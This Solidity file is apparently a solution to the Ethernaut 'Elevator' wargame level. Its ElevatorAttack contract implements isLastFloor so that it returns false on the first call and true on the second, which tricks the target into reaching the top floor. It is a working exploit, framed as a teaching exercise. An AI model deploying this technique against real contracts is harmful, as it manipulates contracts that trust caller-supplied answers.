// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttack is Broadcasted, Building {
    uint256 public constant MAX_FLOOR = 2;
    bool public s_firstTime = true;

    function isLastFloor(uint) external override returns (bool) {
        s_firstTime = s_firstTime ? false : true;
        return s_firstTime;
    }

    function attack(address payable elevatorCtr_) public payable override {
        IElevator(elevatorCtr_).goTo(MAX_FLOOR);
    }

    function broadcastedAttack(
        address payable elevatorCtr_
    ) external payable override {
        // not broadcasted to have the current contract as the caller
        attack(elevatorCtr_);
    }
}

interface IElevator {
    // ! function isLastFloor will return false the first time it is called
    // ! but will return true the second time
    function goTo(uint _floor) external;
}
